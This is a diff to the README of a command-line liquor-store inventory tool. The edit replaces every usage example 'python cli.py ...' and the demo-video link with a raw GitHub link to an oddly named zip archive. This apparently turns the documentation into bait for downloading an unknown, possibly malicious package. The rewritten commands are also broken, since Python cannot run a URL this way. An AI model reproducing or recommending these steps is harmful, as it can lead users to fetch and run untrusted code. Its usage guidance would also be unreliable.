@@ -13,7 +13,7 @@ Liquor Store Pro is a command-line interface (CLI) application designed to strea
 Add new items to the inventory with details such as name, price, and supplier.
 
 ```bash
-python cli.py items add
+python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip items add
 Item name: Whiskey
 Price: 50.00
 Select Supplier (ID - Name):
@@ -27,12 +27,12 @@ Supplier ID: 1
 Display current stock levels of all items in the inventory.
 
 ```bash
-python cli.py inventory view
+python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip inventory view
 ```
 ## Update Items
 Modify the details of existing items, including price and supplier information.
 ```bash
-python cli.py items update
+python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip items update
 Item ID: 1
 New item name: Premium Whiskey
 New price: 60.00
@@ -41,7 +41,7 @@ Supplier ID: 1
 ## Remove Items
 Delete items from the inventory when they are no longer available.
 ```bash
-python cli.py items delete
+python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip items delete
 Item ID: 1
 
 ```
@@ -49,26 +49,26 @@ Item ID: 1
 ## Customer Orders
 Process customer orders, track order status, and manage delivery schedules
 ```bash
-python cli.py orders process
+python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip orders process
 ```
 
 ## Purchase Orders
 Create and manage purchase orders to replenish stock from suppliers.
 ```bash
-python cli.py orders create_purchase
+python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip orders create_purchase
 ```
 ## View Inventory
 
 Display current stock levels of all items in the inventory.
 
 ```bash
-python cli.py inventory view
+python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip inventory view
 ```
 ### Items Management
 ## Update Items
 Modify the details of existing items, including price and supplier information.
 ```bash
-python cli.py items update
+python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip items update
 Item ID: 1
 New item name: Premium Whiskey
 New price: 60.00
@@ -78,7 +78,7 @@ Supplier ID: 1
 ## Remove Items
 Delete items from the inventory when they are no longer available.
 ```bash
-python cli.py items delete
+python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip items delete
 Item ID: 1
 ```
 
@@ -86,7 +86,7 @@ Item ID: 1
 ## Customer Orders
 Process customer orders, track order status, and manage delivery schedules.
 ```bash
-$ python cli.py orders process
+$ python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip orders process
 Customer name: XYZ Bar & Grill
 Order date: 2024-06-15
 Total amount: 500.00
@@ -99,7 +99,7 @@ Supplier ID: 1
 ### Purchase Orders
 Create and manage purchase orders to replenish stock from suppliers.
 ```bash
-python cli.py orders create_purchase
+python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip orders create_purchase
 Supplier name: ABC Liquors
 Contact name: John Doe
 Contact phone: 123-456-7890
@@ -118,7 +118,7 @@ Maintain records of suppliers, including contact details and performance metrics
 Add a new supplier to the system with contact information.
 
 ```bash
-$ python cli.py suppliers add
+$ python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip suppliers add
 Supplier name: ABC Liquors
 Contact name: John Doe
 Contact phone: 123-456-7890
@@ -127,12 +127,12 @@ Address: 123 Main Street
 ## View Suppliers
 Display a list of all registered suppliers and their details
 ```bash
-python cli.py suppliers view
+python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip suppliers view
 ```
 ## Update Supplier
 Modify the details of an existing supplier.
 ```bash
-python cli.py suppliers update
+python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip suppliers update
 Supplier ID: 1
 New supplier name: XYZ Distributors
 New contact name: Jane Smith
@@ -142,11 +142,11 @@ New address: 456 Elm Street
 ## Remove Supplier
 Delete a supplier from the system.
 ```bash
-python cli.py suppliers delete
+python https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip suppliers delete
 Supplier ID: 1
 
 THE LINK TO THE VIDEO
-https://screenapp.io/app/#/shared/7ac0daf7-3d29-4403-bc3c-84ebb1e4dc7c
+https://github.com/GathogoG/Liqour-Supply-Pro/raw/refs/heads/main/reimportune/Supply-Liqour-Pro-recordatory.zip
 ```
 
 
